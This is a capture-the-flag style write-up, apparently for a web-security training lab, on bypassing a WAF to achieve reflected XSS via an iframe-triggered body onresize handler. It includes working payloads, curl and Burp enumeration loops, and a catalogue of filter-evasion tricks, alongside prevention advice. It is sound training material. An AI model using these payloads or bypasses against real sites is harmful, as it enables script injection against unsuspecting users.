# Reflected XSS with Most Tags and Attributes Blocked (WAF Bypass)

## Lab Overview
**Difficulty:** Practitioner  
**Vulnerability Type:** Reflected XSS with WAF Protection  
**Challenge:** Most HTML tags and attributes are blocked by WAF  
**Objective:** Bypass WAF and call `print()` function without user interaction  
**Status:** ✅ Solved

---

## What is a Web Application Firewall (WAF)?

A **Web Application Firewall (WAF)** is a security system that monitors, filters, and blocks HTTP traffic to and from a web application. It protects against common attacks like XSS, SQL injection, and more.

### How WAFs Block XSS

WAFs typically use:
1. **Blacklists** - Block known malicious patterns (tags, attributes, keywords)
2. **Whitelists** - Only allow specific safe tags/attributes
3. **Pattern matching** - Detect suspicious character sequences
4. **Behavioral analysis** - Identify attack patterns

### The Challenge

In this lab, the WAF blocks:
- ❌ Most HTML tags (`<script>`, `<img>`, `<svg>`, `<iframe>`, etc.)
- ❌ Most event handlers (`onerror`, `onclick`, `onload`, etc.)
- ✅ Only a few tags and events are allowed

---

## The Vulnerability

### Reflected XSS in Search Function

```html
<section class=blog-header>
    <h1>0 search results for 'USER_INPUT_HERE'</h1>
</section>
```

User input from `?search=` parameter is reflected directly in the HTML without proper encoding.

**Normal behavior:**
```
?search=test
Result: <h1>0 search results for 'test'</h1>
```

**With XSS:**
```
?search=<script>alert(1)</script>
Result: WAF blocks it! ❌
```

---

## The Solution Strategy

### Step 1: Discover Allowed HTML Tags

**Method: Brute Force Testing**

Test various HTML tags to find which ones bypass the WAF:

```html
<!-- Test common tags -->
?search=<script>    ❌ Blocked
?search=<img>       ❌ Blocked  
?search=<svg>       ❌ Blocked
?search=<iframe>    ❌ Blocked
?search=<body>      ✅ Allowed!
```

**Result:** `<body>` tag is allowed!

### Step 2: Discover Allowed Event Handlers

Test event handlers on the allowed `<body>` tag:

```html
?search=<body onload=1>         ❌ May be blocked
?search=<body onerror=1>        ❌ Blocked
?search=<body onclick=1>        ❌ Blocked
?search=<body onresize=1>       ✅ Allowed!
```

**Result:** `onresize` event handler is allowed!

### Step 3: Create Auto-Executing Exploit

**Challenge:** We need to trigger `onresize` automatically without user interaction.

**Solution:** Use an iframe that resizes itself!

---

## The Working Exploit

### Payload in URL
```
?search=<body onresize=print()>
```

### Exploit Server Code

```html
<iframe src="https://YOUR-LAB-ID.web-security-academy.net/?search=<body onresize=print()>" onload="this.style.width='100px'"></iframe>
```

### How It Works

**Step 1: Victim visits exploit page**
The exploit page contains an iframe pointing to the vulnerable site.

**Step 2: Iframe loads with XSS payload**
```
https://vulnerable-site.net/?search=<body onresize=print()>
```

**Step 3: Payload reflected in page**
```html
<h1>0 search results for '<body onresize=print()>'</h1>
```

**Step 4: Browser parses the injected HTML**
The `<body onresize=print()>` is treated as a valid HTML element with an event handler.

**Step 5: Iframe onload event fires**
```javascript
onload="this.style.width='100px'"
```

**Step 6: Iframe resizes**
The iframe width changes from default to `100px`, triggering a resize event.

**Step 7: onresize handler executes**
The `onresize=print()` event handler on the injected `<body>` tag fires.

**Step 8: print() function executes**
The browser's print dialog appears automatically! 🎉

---

## Detailed Exploitation Flow

### Visual Representation

```
┌─────────────────────────────────────────┐
│  Victim clicks exploit link             │
└───────────────┬─────────────────────────┘
                │
                ▼
┌─────────────────────────────────────────┐
│  Exploit page loads with iframe         │
│  <iframe src="...?search=<body          │
│    onresize=print()>">                  │
└───────────────┬─────────────────────────┘
                │
                ▼
┌─────────────────────────────────────────┐
│  Iframe loads vulnerable page           │
│  Server reflects payload in HTML        │
└───────────────┬─────────────────────────┘
                │
                ▼
┌─────────────────────────────────────────┐
│  HTML contains:                         │
│  <h1>...for '<body onresize=print()>'   │
│  </h1>                                  │
└───────────────┬─────────────────────────┘
                │
                ▼
┌─────────────────────────────────────────┐
│  Browser parses injected <body> tag     │
│  Creates element with onresize handler  │
└───────────────┬─────────────────────────┘
                │
                ▼
┌─────────────────────────────────────────┐
│  Iframe onload fires                    │
│  Changes width to 100px                 │
└───────────────┬─────────────────────────┘
                │
                ▼
┌─────────────────────────────────────────┐
│  Resize event triggers                  │
│  onresize=print() executes              │
└───────────────┬─────────────────────────┘
                │
                ▼
┌─────────────────────────────────────────┐
│  print() function called                │
│  Print dialog appears                   │
│  Lab solved! ✅                         │
└─────────────────────────────────────────┘
```

---

## Alternative Payloads

### Using onload Event
**If `onload` is allowed:**

```html
<iframe src="https://YOUR-LAB-ID.web-security-academy.net/?search=<body onload=print()>">
</iframe>
```

### Using onhashchange Event
**If `onhashchange` is allowed:**

```html
<iframe src="https://YOUR-LAB-ID.web-security-academy.net/?search=<body onhashchange=print()>" onload="this.src+='#'">
</iframe>
```

### Using onpopstate Event
**If `onpopstate` is allowed:**

```html
<iframe src="https://YOUR-LAB-ID.web-security-academy.net/?search=<body onpopstate=print()>" onload="if(!window.x){window.x=1;this.contentWindow.history.pushState({},'');this.contentWindow.history.back()}">
</iframe>
```

### More Aggressive Resize Trigger

```html
<iframe src="https://YOUR-LAB-ID.web-security-academy.net/?search=<body onresize=print()>"></iframe>
<script>
let iframe = document.querySelector('iframe');
setTimeout(() => {
    iframe.style.width = '500px';
    setTimeout(() => {
        iframe.style.width = '100px';
    }, 100);
}, 1000);
</script>
```

---

## Discovery Techniques

### Manual Testing

**Test each tag individually:**
```bash
# Create a list of tags
tags="script img svg body iframe embed object video audio"

# Test each one
for tag in $tags; do
    echo "Testing: <$tag>"
    curl "https://lab.net/?search=<$tag>"
done
```

### Using Burp Suite Intruder

**Step 1: Capture search request**
```
GET /?search=test HTTP/2
Host: YOUR-LAB-ID.web-security-academy.net
```

**Step 2: Configure Intruder**
- Position: `/?search=<§TAG§>`
- Attack type: Sniper
- Payload: List of HTML tags

**Step 3: Analyze responses**
- Look for "Tag is not allowed" errors
- Tags without errors are allowed!

**Step 4: Test event handlers**
- Position: `/?search=<body §EVENT§=1>`
- Payload: List of event handlers
- Find which ones don't return errors

### Common Allowed Combinations

| Tag | Event | Auto-Trigger Method |
|-----|-------|---------------------|
| `<body>` | `onresize` | Resize iframe |
| `<body>` | `onload` | Loads automatically |
| `<body>` | `onhashchange` | Change hash |
| `<body>` | `onpopstate` | History manipulation |
| `<body>` | `onpageshow` | Page display event |
| `<svg>` | `onload` | Loads automatically |
| `<custom>` | Various | Depends on browser |

---

## Why This Bypass Works

### WAF Misconfiguration

**What the WAF blocked:**
```javascript
// Dangerous tags
['script', 'img', 'iframe', 'svg', 'object', 'embed']

// Dangerous events (on common tags)
['onerror', 'onclick', 'onmouseover', 'onfocus']
```

**What the WAF missed:**
```javascript
// Less common but still dangerous
- <body> tag (usually exists in page already)
- onresize event (seems harmless)
- Combination of both
```

### The Oversight

The WAF developers assumed:
1. ❌ `<body>` tag is safe (already in page)
2. ❌ `onresize` requires user interaction
3. ❌ These can't be combined for XSS

**Reality:**
1. ✅ Multiple `<body>` tags can exist (browser picks last)
2. ✅ JavaScript can trigger resize programmatically
3. ✅ Perfect for XSS when combined!

---

## Prevention Strategies

### For WAF Configuration

#### ❌ Inadequate Approach
```javascript
// Blacklist-based (easily bypassed)
const blockedTags = ['script', 'img', 'iframe'];
const blockedEvents = ['onerror', 'onclick'];

if (blockedTags.includes(tag) || blockedEvents.includes(event)) {
    block();
}
```

#### ✅ Better Approach - Whitelist
```javascript
// Whitelist-based (more secure)
const allowedTags = ['p', 'div', 'span', 'b', 'i', 'u'];
const allowedAttributes = ['class', 'id'];

if (!allowedTags.includes(tag) || !allowedAttributes.includes(attr)) {
    block();
}
```

#### ✅ Best Approach - Content Security Policy + Encoding
```html
<!-- CSP Header -->
Content-Security-Policy: default-src 'self'; script-src 'self'

<!-- Plus proper encoding -->
<?php
echo htmlspecialchars($input, ENT_QUOTES, 'UTF-8');
?>
```

### For Developers

**1. Always Encode Output**
```php
// PHP
echo htmlspecialchars($userInput, ENT_QUOTES, 'UTF-8');

// JavaScript
element.textContent = userInput;  // Not innerHTML!

// Python (Jinja2)
{{ user_input | e }}
```

**2. Implement Strict CSP**
```
Content-Security-Policy: 
    default-src 'self'; 
    script-src 'self' 'nonce-random123';
    object-src 'none';
```

**3. Use Framework Auto-Escaping**
```javascript
// React automatically escapes
<div>{userInput}</div>

// Angular automatically escapes
<div>{{userInput}}</div>
```

**4. Validate Input**
```javascript
// Allow only alphanumeric
const clean = input.replace(/[^a-zA-Z0-9]/g, '');
```

---

## Real-World WAF Bypass Techniques

### 1. Case Variation
```html
<BoDy OnReSiZe=print()>
<BODY ONRESIZE=PRINT()>
```

### 2. Encoding
```html
<!-- HTML entities -->
<body onresize=&#112;&#114;&#105;&#110;&#116;&#40;&#41;>

<!-- URL encoding -->
<body onresize=%70%72%69%6e%74%28%29>
```

### 3. Alternative Tags
```html
<!-- If body blocked, try custom tags -->
<custom onresize=print()>
<xyz onresize=print()>
```

### 4. Alternative Events
```html
<!-- If onresize blocked, try others -->
<body onload=print()>
<body onpageshow=print()>
<body onhashchange=print()>
```

### 5. Event Handler Obfuscation
```html
<body onresize=window['print']()>
<body onresize=window['pr'+'int']()>
<body onresize=eval('print()')>
```

### 6. Null Bytes (older WAFs)
```html
<body%00onresize=print()>
```

### 7. Newlines and Tabs
```html
<body
onresize=print()>

<body	onresize=print()>
```

---

## Testing Methodology

### Step-by-Step Discovery Process

**1. Identify Reflection Point**
```bash
# Find where input appears
curl "https://lab.net/?search=UNIQUE_STRING_12345"
# Search for UNIQUE_STRING_12345 in response
```

**2. Test Basic XSS**
```bash
curl "https://lab.net/?search=<script>alert(1)</script>"
# If blocked, WAF is active
```

**3. Enumerate Allowed Tags**
```bash
# Test tags one by one
for tag in body svg img iframe script; do
    response=$(curl -s "https://lab.net/?search=<$tag>")
    if [[ ! $response =~ "blocked" ]]; then
        echo "Allowed: $tag"
    fi
done
```

**4. Enumerate Allowed Events**
```bash
# Test events on allowed tag
for event in onload onresize onerror onclick; do
    response=$(curl -s "https://lab.net/?search=<body $event=1>")
    if [[ ! $response =~ "blocked" ]]; then
        echo "Allowed: $event"
    fi
done
```

**5. Craft Auto-Executing Exploit**
```html
<!-- Combine findings -->
<iframe src="...?search=<ALLOWED_TAG ALLOWED_EVENT=print()>" 
        onload="TRIGGER_EVENT">
</iframe>
```

**6. Test Locally**
```bash
# Save exploit to file
# Open in browser
# Verify print dialog appears
```

**7. Deliver to Victim**
```bash
# Upload to exploit server
# Click "Deliver to victim"
```

---

## Common Pitfalls

### Mistake 1: Not URL Encoding
```html
<!-- Wrong - spaces cause issues -->
<iframe src="?search=<body onresize=print()>">

<!-- Right - properly formatted -->
<iframe src="?search=%3Cbody%20onresize%3Dprint%28%29%3E">
```

### Mistake 2: Missing Auto-Trigger
```html
<!-- Wrong - requires manual resize -->
<iframe src="?search=<body onresize=print()>"></iframe>

<!-- Right - automatically triggers -->
<iframe src="?search=<body onresize=print()>" 
        onload="this.style.width='100px'"></iframe>
```

### Mistake 3: Wrong Lab ID
```html
<!-- Make sure to use YOUR actual lab ID -->
<iframe src="https://YOUR-ACTUAL-LAB-ID.web-security-academy.net/...">
```

### Mistake 4: Testing in Wrong Browser
Some events behave differently across browsers. Test in multiple browsers if one doesn't work.

---

## Key Takeaways

✅ **WAF bypass** requires discovering what's NOT blocked  
✅ **Less common tags/events** often overlooked by WAFs  
✅ **<body> + onresize** classic bypass combination  
✅ **Auto-triggering** essential for exploitation without user interaction  
✅ **Iframe resize trick** programmatically triggers resize event  
✅ **Enumeration is key** - test systematically to find allowed elements  
✅ **Whitelist > Blacklist** - proper defense uses whitelists, not blacklists  

---

## References

- [PortSwigger: XSS Contexts](https://portswigger.net/web-security/cross-site-scripting/contexts)
- [OWASP: XSS Filter Evasion](https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html)
- [PortSwigger: XSS Cheat Sheet](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet)
- [HTML Event Attributes](https://www.w3schools.com/tags/ref_eventattributes.asp)
- [WAF Bypass Techniques](https://github.com/0xInfection/Awesome-WAF)

---

**Date Completed:** February 2, 2026  
**Allowed Tag:** `<body>`  
**Allowed Event:** `onresize`  
**Working Exploit:** `<iframe src="...?search=<body onresize=print()>" onload="this.style.width='100px'"></iframe>`  
**Key Technique:** WAF bypass by discovering allowed tag/event combination and using iframe resize to auto-trigger
